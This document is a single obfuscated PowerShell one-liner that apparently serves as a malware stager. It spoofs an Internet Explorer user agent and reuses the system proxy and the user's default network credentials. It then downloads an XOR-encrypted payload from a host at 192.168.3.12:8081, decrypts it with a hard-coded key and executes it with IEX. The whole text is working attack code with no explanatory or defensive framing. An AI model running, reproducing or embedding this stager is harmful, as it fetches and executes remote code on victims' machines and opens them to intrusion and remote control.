
$wc=NEw-OBject SysteM.NeT.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaders.ADD('User-Agent',$u);$wC.ProxY = [SYSTEM.NeT.WebReqUeSt]::DefaULtWEbPROXy;$WC.ProXy.CREdenTiaLs = [SysTem.NET.CreDENTialCaChE]::DEFaulTNeTWoRkCreDenTiAls;$K='@-KQP<Dud261\H*l[VA%wyEOJq^Zp;(h';$I=0;[CHAR[]]$B=([cHaR[]]($wc.DowNlOADStriNg("http://192.168.3.12:8081/index.asp")))|%{$_-bXOR$K[$I++%$k.LeNgtH]};IEX ($B-jOIN'')

